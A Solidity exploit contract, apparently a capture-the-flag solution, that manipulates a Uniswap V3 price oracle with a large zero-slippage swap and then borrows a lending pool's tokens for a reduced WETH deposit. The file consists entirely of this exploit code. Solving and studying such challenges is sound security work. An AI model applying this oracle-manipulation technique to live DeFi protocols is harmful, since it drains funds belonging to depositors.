// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma abicoder v2;

import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import "./PuppetV3Pool.sol";
import "hardhat/console.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address dst, uint wad) external returns (bool);

    function balanceOf(address account) external returns (uint256);
}

contract AttackPuppetV3 {
    ISwapRouter public immutable swapRouter;
    PuppetV3Pool public immutable lendingPool;
    IERC20 immutable token;
    address immutable player;

    uint16 public constant poolFee = 3000;
    address public constant WETH9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 public constant SWAP_AMOUNT = 110 ether;
    uint256 public constant STEAL_AMOUNT = 1_000_000 ether;

    constructor(
        ISwapRouter _swapRouter,
        PuppetV3Pool _lendingPool,
        IERC20 _token,
        address _player
    ) payable {
        swapRouter = _swapRouter;
        lendingPool = _lendingPool;
        token = _token;
        player = _player;
    }

    function attack() external {
        token.approve(address(swapRouter), SWAP_AMOUNT);

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: address(token),
                tokenOut: WETH9,
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: SWAP_AMOUNT,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        swapRouter.exactInputSingle(params);
    }

    function finaliseAttack() external {
        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(
            STEAL_AMOUNT
        );
        IERC20(WETH9).approve(address(lendingPool), depositRequired);
        lendingPool.borrow(STEAL_AMOUNT);
        require(
            token.balanceOf(address(this)) >= STEAL_AMOUNT,
            "Steal not sucessful!"
        );
        token.transfer(player, STEAL_AMOUNT);
    }
}
